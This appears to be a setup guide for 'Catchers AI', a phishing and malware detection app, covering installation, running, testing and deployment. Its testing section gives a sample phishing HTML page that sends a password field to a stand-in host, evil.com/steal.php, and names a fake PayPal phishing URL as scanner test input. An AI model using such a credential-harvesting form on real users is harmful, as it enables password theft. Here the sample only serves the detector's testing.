# 🚀 Catchers AI - Setup Guide

## Prerequisites

- **Node.js** 16+ and npm
- **Python** 3.9+
- **MongoDB Atlas** account (or local MongoDB)
- **API Keys** (see below)

---

## 🔑 Required API Keys

### 1. Google Safe Browsing API
1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a new project or select existing
3. Enable "Safe Browsing API"
4. Go to Credentials → Create Credentials → API Key
5. Copy the API key

### 2. VirusTotal API
1. Sign up at [VirusTotal](https://www.virustotal.com/)
2. Go to your profile → API Key
3. Copy the API key (free tier: 4 requests/minute)

### 3. MongoDB Atlas
1. Sign up at [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Create a free cluster
3. Create a database user
4. Get connection string (replace `<password>` with your password)

---

## 📦 Installation

### 1. Clone the Repository
```bash
git clone https://github.com/noblex1/catchers-ai.git
cd catchers-ai
```

### 2. Setup Backend
```bash
cd backend

# Install dependencies
npm install

# Create .env file
cp .env.example .env

# Edit .env and add your credentials
# Use your favorite editor (nano, vim, notepad, VS Code, etc.)
nano .env
```

**Backend `.env` configuration:**
```env
CORS_ORIGIN=http://localhost:8081
GOOGLE_SAFEBROWSING_API_KEY=your_actual_key_here
VIRUSTOTAL_API_KEY=your_actual_key_here
ML_SERVICE_URL=http://localhost:5000
MONGODB_URI=your_mongodb_connection_string_here
```

### 3. Setup ML Service
```bash
cd ../ml-service

# Create virtual environment (recommended)
python -m venv venv

# Activate virtual environment
# Windows:
venv\Scripts\activate
# Mac/Linux:
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Create .env file (optional - uses defaults)
cp .env.example .env

# Train the ML model
python app/train_model.py
```

### 4. Setup Frontend
```bash
cd ../frontend

# Install dependencies
npm install

# Create .env file
cp .env.example .env

# Edit .env if needed (default values should work)
nano .env
```

**Frontend `.env` configuration:**
```env
VITE_API_BASE_URL=http://localhost:3000
VITE_APP_NAME=Catchers AI
```

---

## 🏃 Running the Application

You need **3 terminal windows** to run all services:

### Terminal 1 - ML Service
```bash
cd ml-service
# Activate venv if not already active
python -m uvicorn app.main:app --host 0.0.0.0 --port 5000
```

**Expected output:**
```
INFO:     Started server process
INFO:     Uvicorn running on http://0.0.0.0:5000
INFO:     Model loaded successfully
```

### Terminal 2 - Backend
```bash
cd backend
npm run dev
```

**Expected output:**
```
Server running on port 3000
MongoDB connected successfully
```

### Terminal 3 - Frontend
```bash
cd frontend
npm run dev
```

**Expected output:**
```
VITE ready in XXX ms
➜  Local:   http://localhost:8081/
```

---

## 🧪 Testing the Application

### 1. Open Browser
Navigate to: **http://localhost:8081**

### 2. Test URL Scanning
- Click "Scan URL" or go to `/scan`
- Enter a test URL: `http://phishing-site-verify-paypal.tk/login`
- Click "Analyze"
- Wait for results (1-6 seconds)

### 3. Test File Scanning
- Click "Scan File" or go to `/file-scan`
- Create a test file `phishing.html`:
```html
<html>
<body>
<h1>URGENT: Verify Your Account</h1>
<form action="http://evil.com/steal.php">
  <input type="password" name="pass">
</form>
<iframe src="http://malware.com"></iframe>
</body>
</html>
```
- Upload and analyze

### 4. Check History
- Go to `/history`
- View your scan history (stored locally in browser)

### 5. View Statistics
- Go to `/dashboard`
- See global statistics from all users

---

## 🔧 Troubleshooting

### Backend won't start
**Error:** `MongoDB connection failed`
- Check your `MONGODB_URI` in `backend/.env`
- Ensure your IP is whitelisted in MongoDB Atlas
- Verify database user credentials

**Error:** `Port 3000 already in use`
```bash
# Windows
netstat -ano | findstr :3000
taskkill /PID <PID> /F

# Mac/Linux
lsof -ti:3000 | xargs kill -9
```

### ML Service won't start
**Error:** `Model file not found`
```bash
cd ml-service
python app/train_model.py
```

**Error:** `Module not found`
```bash
pip install -r requirements.txt
```

### Frontend won't start
**Error:** `Port 8081 already in use`
- Vite will automatically try the next available port
- Or kill the process using port 8081

**Error:** `Cannot connect to backend`
- Ensure backend is running on port 3000
- Check `VITE_API_BASE_URL` in `frontend/.env`

### API Rate Limits
**VirusTotal:** Free tier = 4 requests/minute
- Wait 15 seconds between scans
- Or upgrade to premium

**Google Safe Browsing:** 10,000 requests/day
- Should be sufficient for development

---

## 📁 Project Structure

```
catchers-ai/
├── backend/              # Node.js + Express API
│   ├── src/
│   ├── .env             # Your credentials (not in Git)
│   └── .env.example     # Template
├── ml-service/          # Python + FastAPI + ML
│   ├── app/
│   ├── .env             # Optional config (not in Git)
│   └── .env.example     # Template
├── frontend/            # React + TypeScript
│   ├── src/
│   ├── .env             # API URL (not in Git)
│   └── .env.example     # Template
└── Documentation/
```

---

## 🔒 Security Best Practices

### DO:
✅ Use `.env` files for secrets  
✅ Keep `.env` files in `.gitignore`  
✅ Use `.env.example` for templates  
✅ Rotate API keys regularly  
✅ Use environment-specific configs  

### DON'T:
❌ Commit `.env` files to Git  
❌ Hardcode API keys in source code  
❌ Share API keys in chat/email  
❌ Use production keys in development  
❌ Expose `.env` files publicly  

---

## 🚀 Deployment

### Frontend (Vercel/Netlify)
1. Connect your GitHub repository
2. Set build command: `npm run build`
3. Set output directory: `dist`
4. Add environment variable: `VITE_API_BASE_URL=https://your-backend-url.com`

### Backend (Render/Railway/Heroku)
1. Connect your GitHub repository
2. Set build command: `npm install && npm run build`
3. Set start command: `npm start`
4. Add all environment variables from `.env.example`

### ML Service (Render/Railway)
1. Connect your GitHub repository
2. Set build command: `pip install -r requirements.txt`
3. Set start command: `uvicorn app.main:app --host 0.0.0.0 --port $PORT`
4. Ensure `phishing_detector.pkl` is included

---

## 📚 Additional Resources

- [Backend API Documentation](http://localhost:3000/api-docs) (when running)
- [MongoDB Atlas Docs](https://docs.atlas.mongodb.com/)
- [VirusTotal API Docs](https://developers.virustotal.com/reference)
- [Google Safe Browsing API](https://developers.google.com/safe-browsing)

---

## 🆘 Need Help?

- Check `SECURITY_NOTICE.md` for security-related issues
- Check `PROJECT_STATUS.md` for project overview
- Open an issue on GitHub
- Contact the maintainer

---

**Happy Scanning! 🛡️**
